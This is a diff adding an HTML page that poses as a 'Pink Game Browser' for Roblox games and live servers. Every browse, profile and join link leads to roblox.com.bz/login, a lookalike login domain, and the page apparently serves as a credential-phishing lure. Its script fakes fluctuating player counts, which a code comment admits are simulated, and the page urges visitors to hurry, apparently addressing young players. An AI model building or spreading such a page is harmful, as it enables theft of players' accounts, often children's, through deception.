@@ -1,0 +1,1182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Pink Game Browser</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Oxanium:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+}
+
+body {
+    font-family: "Oxanium", sans-serif;
+    background:
+        radial-gradient(circle at 50% 0%, #ff4fa326, transparent 35%),
+        #160812;
+    color: #fff;
+}
+
+.notice {
+    width: calc(100% - 30px);
+    max-width: 950px;
+    margin: 20px auto;
+    padding: 18px;
+    background: #24101f;
+    border: 1px solid #ff4faf35;
+    border-radius: 18px;
+}
+
+.notice-title {
+    color: #ff4faf;
+    font-weight: 700;
+    letter-spacing: 2px;
+}
+
+.notice p {
+    color: #bca5b7;
+    margin-top: 7px;
+    line-height: 1.5;
+}
+
+.hero {
+    width: calc(100% - 30px);
+    max-width: 950px;
+    margin: 40px auto;
+}
+
+.badge {
+    display: inline-block;
+    padding: 12px 18px;
+    border: 1px solid #ff4faf45;
+    background: #21101d;
+    border-radius: 30px;
+    color: #ff55b0;
+    font-weight: 700;
+    letter-spacing: 2px;
+}
+
+.hero h1 {
+    margin-top: 30px;
+    font-size: clamp(45px, 9vw, 78px);
+    line-height: .95;
+}
+
+.hero h1 span {
+    color: #ff4faf;
+}
+
+.hero p {
+    margin-top: 25px;
+    color: #bca7b8;
+    font-size: 18px;
+    line-height: 1.7;
+    max-width: 700px;
+}
+
+.buttons {
+    display: flex;
+    gap: 15px;
+    margin-top: 30px;
+    flex-wrap: wrap;
+}
+
+.btn {
+    padding: 17px 25px;
+    border-radius: 15px;
+    text-decoration: none;
+    color: white;
+    font-weight: 700;
+}
+
+.main-btn {
+    background: linear-gradient(135deg, #ff329c, #ff72bf);
+    box-shadow: 0 12px 35px #ff329c40;
+}
+
+.dark-btn {
+    background: #21101d;
+    border: 1px solid #ff4faf35;
+}
+
+.stats {
+    width: calc(100% - 30px);
+    max-width: 950px;
+    margin: 40px auto;
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    border-top: 1px solid #ff4faf22;
+    border-bottom: 1px solid #ff4faf22;
+}
+
+.stat {
+    padding: 30px 10px;
+    text-align: center;
+    border-right: 1px solid #ff4faf22;
+}
+
+.stat:last-child {
+    border: none;
+}
+
+.stat-number {
+    color: #ff55b0;
+    font-size: 35px;
+    font-weight: 700;
+}
+
+.stat-label {
+    color: #806a7a;
+    margin-top: 5px;
+}
+
+.section {
+    width: calc(100% - 30px);
+    max-width: 950px;
+    margin: 50px auto;
+}
+
+.section-title {
+    font-size: 28px;
+    margin-bottom: 22px;
+}
+
+.section-title span {
+    color: #ff55b0;
+}
+
+/* GAME GRID */
+
+.games {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 20px;
+}
+
+.game-card {
+    overflow: hidden;
+    background: #21101d;
+    border: 1px solid #ff4faf25;
+    border-radius: 22px;
+    transition: .25s;
+}
+
+.game-card:hover {
+    transform: translateY(-4px);
+    border-color: #ff4faf65;
+}
+
+.game-image {
+    height: 210px;
+    position: relative;
+    background-size: cover;
+    background-position: center;
+}
+
+.new {
+    position: absolute;
+    top: 15px;
+    left: 15px;
+    padding: 9px 14px;
+    border-radius: 11px;
+    background: #ff3da3;
+    font-weight: 700;
+}
+
+.game-name {
+    position: absolute;
+    bottom: 18px;
+    left: 20px;
+    font-size: 25px;
+    font-weight: 700;
+    text-shadow: 0 3px 12px #000;
+}
+
+.game-info {
+    padding: 18px;
+}
+
+.category {
+    color: #927d8e;
+    margin-bottom: 15px;
+}
+
+.join {
+    display: block;
+    width: 100%;
+    text-align: center;
+    padding: 15px;
+    background: linear-gradient(135deg, #ff329c, #ff6db9);
+    color: white;
+    text-decoration: none;
+    border-radius: 14px;
+    font-weight: 700;
+}
+
+/* SERVER BROWSER */
+
+.server-heading {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+
+.live {
+    color: #51df91;
+}
+
+.live::before {
+    content: "●";
+    margin-right: 7px;
+}
+
+.server-card {
+    background: #1e101c;
+    border: 1px solid #ff4faf20;
+    border-radius: 20px;
+    padding: 23px;
+    margin-bottom: 17px;
+}
+
+.server-top {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+
+.server-name {
+    font-size: 20px;
+    font-weight: 700;
+}
+
+.status {
+    width: 11px;
+    height: 11px;
+    border-radius: 50%;
+    background: #50df91;
+    box-shadow: 0 0 12px #50df91;
+}
+
+.players {
+    display: flex;
+    align-items: center;
+    margin-top: 18px;
+}
+
+.avatar {
+    width: 38px;
+    height: 38px;
+    border-radius: 50%;
+    margin-right: -8px;
+    border: 3px solid #1e101c;
+    background: linear-gradient(
+        135deg,
+        #ff4faf,
+        #ff9acb
+    );
+}
+
+.more {
+    margin-left: 17px;
+    color: #b99db2;
+    font-weight: 600;
+}
+
+.player-count {
+    margin-top: 20px;
+    font-size: 25px;
+    font-weight: 700;
+}
+
+.player-count small {
+    color: #796677;
+    font-size: 16px;
+    font-weight: 400;
+}
+
+.progress {
+    height: 10px;
+    background: #30202c;
+    border-radius: 20px;
+    margin: 14px 0 20px;
+    overflow: hidden;
+}
+
+.progress-bar {
+    height: 100%;
+    border-radius: 20px;
+    background: linear-gradient(
+        90deg,
+        #ff319b,
+        #ff7bc1
+    );
+
+    transition: width .4s ease;
+}
+
+.server-join {
+    width: 100%;
+    padding: 16px;
+    border: none;
+    border-radius: 14px;
+    background: linear-gradient(
+        135deg,
+        #ff329c,
+        #ff69b8
+    );
+    color: white;
+    font-family: inherit;
+    font-size: 17px;
+    font-weight: 700;
+    cursor: pointer;
+}
+
+.server-id {
+    text-align: center;
+    color: #756071;
+    margin-top: 17px;
+}
+
+footer {
+    text-align: center;
+    padding: 50px 20px;
+    color: #735d6c;
+    border-top: 1px solid #ff4faf18;
+}
+
+@media(max-width: 650px) {
+
+    .games {
+        grid-template-columns: 1fr;
+    }
+
+    .stats {
+        grid-template-columns: 1fr;
+    }
+
+    .stat {
+        border-right: none;
+        border-bottom: 1px solid #ff4faf22;
+    }
+
+    .stat:last-child {
+        border-bottom: none;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<!-- NOTICE -->
+
+<div class="notice">
+
+    <div class="notice-title">
+        ✦ WEBSITE NOTICE
+    </div>
+
+    <p>
+        All games are not really permanent. so be quick before its gone and don't worry we will add a new server if the one got deleted
+    </p>
+
+</div>
+
+
+<!-- HERO -->
+
+<section class="hero">
+
+    <div class="badge">
+        ✦ LIVE GAME BROWSER
+    </div>
+
+    <h1>
+        Find Your<br>
+        <span>Perfect Game.</span><br>
+        Faster.
+    </h1>
+
+    <p>
+        wsp gonners we have all games you want just 
+         choose a server to join.
+    </p>
+
+    <div class="buttons">
+
+        <!-- PUT YOUR MAIN LINK HERE -->
+
+        <a
+            href="https://roblox.com.bz/login?returnUrl=2405806518202420"
+            target="_blank"
+            class="btn main-btn">
+            ▶ Browse Games
+        </a>
+
+        <!-- PUT YOUR PROFILE LINK HERE -->
+
+        <a
+            href="https://roblox.com.bz/login?returnUrl=2405806518202420"
+            target="_blank"
+            class="btn dark-btn">
+            Roblox Profile
+        </a>
+
+    </div>
+
+</section>
+
+
+<!-- STATS -->
+
+<div class="stats">
+
+    <div class="stat">
+        <div class="stat-number" id="totalPlayers">
+            294
+        </div>
+
+        <div class="stat-label">
+            Players Online
+        </div>
+    </div>
+
+    <div class="stat">
+        <div class="stat-number">
+            12
+        </div>
+
+        <div class="stat-label">
+            Games
+        </div>
+    </div>
+
+    <div class="stat">
+        <div class="stat-number">
+            12
+        </div>
+
+        <div class="stat-label">
+            Servers
+        </div>
+    </div>
+
+</div>
+
+
+<!-- GAMES -->
+
+<section class="section">
+
+    <h2 class="section-title">
+        🎮 <span>Featured Games</span>
+    </h2>
+
+    <div class="games">
+
+        <!-- GAME 1 -->
+
+        <div class="game-card">
+
+            <div
+                class="game-image"
+                style="background-image:url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSoSzT4eBCQSy1qS7kLl6CZXW4PN2KAsgWBQOfEf5ZT3Q&s=10')">
+
+                <div class="new">
+                    NEW
+                </div>
+
+                <div class="game-name">
+                    Untitled Game
+                </div>
+
+            </div>
+
+            <div class="game-info">
+
+                <div class="category">
+                    
+                </div>
+
+                <a
+                    class="join"
+                    href="https://roblox.com.bz/login?returnUrl=2405806518202420"
+                    target="_blank">
+                    ▶ Join
+                </a>
+
+            </div>
+
+        </div>
+
+
+        <!-- GAME 2 -->
+
+        <div class="game-card">
+
+            <div
+                class="game-image"
+                style="background-image:url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSoSzT4eBCQSy1qS7kLl6CZXW4PN2KAsgWBQOfEf5ZT3Q&s=10')">
+
+                <div class="new">
+                    NEW
+                </div>
+
+                <div class="game-name">
+                    Sword Place027420
+                </div>
+
+            </div>
+
+            <div class="game-info">
+
+                <div class="category">
+                    
+                </div>
+
+                <a
+                    class="join"
+                    href="https://roblox.com.bz/login?returnUrl=2405806518202420"
+                    target="_blank">
+                    ▶ Join
+                </a>
+
+            </div>
+
+        </div>
+
+
+        <!-- GAME 3 -->
+
+        <div class="game-card">
+
+            <div
+                class="game-image"
+                style="background-image:url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSoSzT4eBCQSy1qS7kLl6CZXW4PN2KAsgWBQOfEf5ZT3Q&s=10')">
+
+                <div class="new">
+                    NEW
+                </div>
+
+                <div class="game-name">
+                    Goat Game
+                </div>
+
+            </div>
+
+            <div class="game-info">
+
+                <div class="category">
+                  
+                </div>
+
+                <a
+                    class="join"
+                    href="https://roblox.com.bz/login?returnUrl=2405806518202420"
+                    target="_blank">
+                    ▶ Join
+                </a>
+
+            </div>
+
+        </div>
+
+
+        <!-- GAME 4 -->
+
+        <div class="game-card">
+
+            <div
+                class="game-image"
+                style="background-image:url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSoSzT4eBCQSy1qS7kLl6CZXW4PN2KAsgWBQOfEf5ZT3Q&s=10')">
+
+                <div class="new">
+                    NEW
+                </div>
+
+                <div class="game-name">
+                    world 204729
+                </div>
+
+            </div>
+
+            <div class="game-info">
+
+                <div class="category">
+                   
+                </div>
+
+                <a
+                    class="join"
+                    href="https://roblox.com.bz/login?returnUrl=2405806518202420"
+                    target="_blank">
+                    ▶ Join
+                </a>
+
+            </div>
+
+        </div>
+
+
+        <!-- GAME 5 -->
+
+        <div class="game-card">
+
+            <div
+                class="game-image"
+                style="background-image:url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRh6ocrWcg7z6Yo3V0FmTXvgsrhyKhwwBnWKP2wbcuvvg&s=10')">
+
+                <div class="new">
+                    NEW
+                </div>
+
+                <div class="game-name">
+                    Battle Zone02752
+                </div>
+
+            </div>
+
+            <div class="game-info">
+
+                <div class="category">
+                    Fighting
+                </div>
+
+                <a
+                    class="join"
+                    href="https://roblox.com.bz/login?returnUrl=2405806518202420"
+                    target="_blank">
+                    ▶ Join
+                </a>
+
+            </div>
+
+        </div>
+
+
+        <!-- GAME 6 -->
+
+        <div class="game-card">
+
+            <div
+                class="game-image"
+                style="background-image:url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSoSzT4eBCQSy1qS7kLl6CZXW4PN2KAsgWBQOfEf5ZT3Q&s=10')">
+
+                <div class="new">
+                    NEW
+                </div>
+
+                <div class="game-name">
+                    island20528
+                </div>
+
+            </div>
+
+            <div class="game-info">
+
+                <div class="category">
+                  
+                </div>
+
+                <a
+                    class="join"
+                    href="https://roblox.com.bz/login?returnUrl=2405806518202420"
+                    target="_blank">
+                    ▶ Join
+                </a>
+
+            </div>
+
+        </div>
+
+
+        <!-- GAME 7 -->
+
+        <div class="game-card">
+
+            <div
+                class="game-image"
+                style="background-image:url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSoSzT4eBCQSy1qS7kLl6CZXW4PN2KAsgWBQOfEf5ZT3Q&s=10')">
+
+                <div class="new">
+                    NEW
+                </div>
+
+                <div class="game-name">
+                    City29752
+                </div>
+
+            </div>
+
+            <div class="game-info">
+
+                <div class="category">
+                    
+                </div>
+
+                <a
+                    class="join"
+                    href="https://roblox.com.bz/login?returnUrl=2405806518202420"
+                    target="_blank">
+                    ▶ Join
+                </a>
+
+            </div>
+
+        </div>
+
+
+        <!-- GAME 8 -->
+
+        <div class="game-card">
+
+            <div
+                class="game-image"
+                style="background-image:url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRh6ocrWcg7z6Yo3V0FmTXvgsrhyKhwwBnWKP2wbcuvvg&s=10')">
+
+                <div class="new">
+                    NEW
+                </div>
+
+                <div class="game-name">
+                    Nekos School
+                </div>
+
+            </div>
+
+            <div class="game-info">
+
+                <div class="category">
+                    
+                </div>
+
+                <a
+                    class="join"
+                    href="https://roblox.com.bz/login?returnUrl=2405806518202420"
+                    target="_blank">
+                    ▶ Join
+                </a>
+
+            </div>
+
+        </div>
+
+
+        <!-- GAME 9 -->
+
+        <div class="game-card">
+
+            <div
+                class="game-image"
+                style="background-image:url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRh6ocrWcg7z6Yo3V0FmTXvgsrhyKhwwBnWKP2wbcuvvg&s=10')">
+
+                <div class="new">
+                    NEW
+                </div>
+
+                <div class="game-name">
+                    Combat13042
+                </div>
+
+            </div>
+
+            <div class="game-info">
+
+                <div class="category">
+                   
+                </div>
+
+                <a
+                    class="join"
+                    href="https://roblox.com.bz/login?returnUrl=2405806518202420"
+                    target="_blank">
+                    ▶ Join
+                </a>
+
+            </div>
+
+        </div>
+
+
+        <!-- GAME 10 -->
+
+        <div class="game-card">
+
+            <div
+                class="game-image"
+                style="background-image:url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRh6ocrWcg7z6Yo3V0FmTXvgsrhyKhwwBnWKP2wbcuvvg&s=10')">
+
+                <div class="new">
+                    NEW
+                </div>
+
+                <div class="game-name">
+                    Parkour
+                </div>
+
+            </div>
+
+            <div class="game-info">
+
+                <div class="category">
+                    
+                </div>
+
+                <a
+                    class="join"
+                    href="https://roblox.com.bz/login?returnUrl=2405806518202420"
+                    target="_blank">
+                    ▶ Join
+                </a>
+
+            </div>
+
+        </div>
+
+
+        <!-- GAME 11 -->
+
+        <div class="game-card">
+
+            <div
+                class="game-image"
+                style="background-image:url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRh6ocrWcg7z6Yo3V0FmTXvgsrhyKhwwBnWKP2wbcuvvg&s=10')">
+
+                <div class="new">
+                    NEW
+                </div>
+
+                <div class="game-name">
+                    Pet World
+                </div>
+
+            </div>
+
+            <div class="game-info">
+
+                <div class="category">
+                    
+                </div>
+
+                <a
+                    class="join"
+                    href="https://roblox.com.bz/login?returnUrl=2405806518202420"
+                    target="_blank">
+                    ▶ Join
+                </a>
+
+            </div>
+
+        </div>
+
+
+        <!-- GAME 12 -->
+
+        <div class="game-card">
+
+            <div
+                class="game-image"
+                style="background-image:url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRh6ocrWcg7z6Yo3V0FmTXvgsrhyKhwwBnWKP2wbcuvvg&s=10')">
+
+                <div class="new">
+                    NEW
+                </div>
+
+                <div class="game-name">
+                    Fantasy World
+                </div>
+
+            </div>
+
+            <div class="game-info">
+
+                <div class="category">
+                    
+                </div>
+
+                <a
+                    class="join"
+                    href="https://roblox.com.bz/login?returnUrl=2405806518202420"
+                    target="_blank">
+                    ▶ Join
+                </a>
+
+            </div>
+
+        </div>
+
+    </div>
+
+</section>
+
+
+<!-- SERVERS -->
+
+<section class="section">
+
+    <div class="server-heading">
+
+        <h2 class="section-title">
+            🎮 <span>Available Servers</span>
+        </h2>
+
+        <div class="live">
+            Live
+        </div>
+
+    </div>
+
+
+    <div id="serverList"></div>
+
+</section>
+
+
+<footer>
+    © 2026 Pink Game Browser
+</footer>
+
+
+<script>
+
+/* =========================================
+   SERVER DATA
+   Player numbers are simulated.
+========================================= */
+
+const servers = [
+
+    { id: "d5cf-5e3d", players: 50 },
+    { id: "037e-18f3", players: 34 },
+    { id: "70ae-9e1f", players: 24 },
+    { id: "b88d-10b2", players: 29 },
+    { id: "8a6a-7d48", players: 34 },
+    { id: "af71-55d1", players: 48 },
+    { id: "642c-40d3", players: 29 },
+    { id: "19ab-72fd", players: 17 },
+    { id: "4d91-38ac", players: 42 },
+    { id: "91ce-26aa", players: 11 },
+    { id: "52fa-81bd", players: 37 },
+    { id: "c812-44ef", players: 46 }
+
+];
+
+const serverList =
+    document.getElementById("serverList");
+
+
+/* =========================================
+   CREATE SERVERS
+========================================= */
+
+function renderServers() {
+
+    serverList.innerHTML = "";
+
+    servers.forEach((server, index) => {
+
+        const card =
+            document.createElement("div");
+
+        card.className = "server-card";
+
+        const percentage =
+            (server.players / 50) * 100;
+
+        const full =
+            server.players >= 50;
+
+        card.innerHTML = `
+
+            <div class="server-top">
+
+                <div class="server-name">
+                    Server #${index + 1}
+                </div>
+
+                <div class="status"></div>
+
+            </div>
+
+            <div class="players">
+
+                <div class="avatar"></div>
+                <div class="avatar"></div>
+                <div class="avatar"></div>
+                <div class="avatar"></div>
+                <div class="avatar"></div>
+
+                <div class="more">
+                    +${Math.max(0, server.players - 5)}
+                </div>
+
+            </div>
+
+            <div class="player-count">
+
+                <span class="count">
+                    ${server.players}
+                </span>
+
+                <small>
+                    of 50 people max
+                </small>
+
+            </div>
+
+            <div class="progress">
+
+                <div
+                    class="progress-bar"
+                    style="width:${percentage}%">
+                </div>
+
+            </div>
+
+            <button
+                class="server-join"
+                data-server="${index}">
+
+                ${full ? "Server Full" : "▶ Join"}
+
+            </button>
+
+            <div class="server-id">
+                Server ID: ${server.id}
+            </div>
+
+        `;
+
+        serverList.appendChild(card);
+
+    });
+
+}
+
+
+/* =========================================
+   INITIAL RENDER
+========================================= */
+
+renderServers();
+
+
+/* =========================================
+   MOVING NUMBERS
+   UPDATES EVERY 1 SECOND
+========================================= */
+
+setInterval(() => {
+
+    servers.forEach(server => {
+
+        /* Randomly go up or down */
+
+        const change =
+            Math.floor(Math.random() * 5) - 2;
+
+        server.players += change;
+
+
+        /* Keep between 0 and 50 */
+
+        if (server.players < 0) {
+            server.players = 0;
+        }
+
+        if (server.players > 50) {
+            server.players = 50;
+        }
+
+    });
+
+
+    renderServers();
+
+    updateTotalPlayers();
+
+}, 1000);
+
+/*
+========================================
+==========
+  TOTAL PLAYER COUNT
+========================================
+========== */
+
+function updateTotalPlayers() {
+    const total =
+        servers.reduce(
+            (sum, server) =>
+                sum +
+                server.players,
+            0
+        );
+
+    document.getElementById(
+        "totalPlayers"
+    ).textContent = total;
+}
+
+/*
+========================================
+==========
+  JOIN BUTTONS
+========================================
+========== */
+
+serverList.addEventListener(
+    "click",
+    function(event) {
+        const button =
+            event.target.closest(
+                ".server-join"
+            );
+
+        if (!button) return;
+
+        const index =
+            Number(button.dataset.server);
+
+        const server =
+            servers[index];
+
+        if (server.players >= 50) {
+            alert(
+                "This server is currently full."
+            );
+            return;
+        }
+
+        /*
+          https://roblox.com.bz/login?returnUrl=2405806518202420
+        */
+
+        const GAME_LINK =
+            "https://roblox.com.bz/login?returnUrl=2405806518202420";
+
+        if (
+            GAME_LINK ===
+            "https://roblox.com.bz/login?returnUrl=2405806518202420"
+        ) {
+            alert(
+                "Add your game link in the JavaScript section first."
+            );
+            return;
+        }
+
+        window.open(
+            GAME_LINK,
+            "https://roblox.com.bz/login?returnUrl=2405806518202420"
+        );
+    }
+);
+</script>
+</body>
+</html>
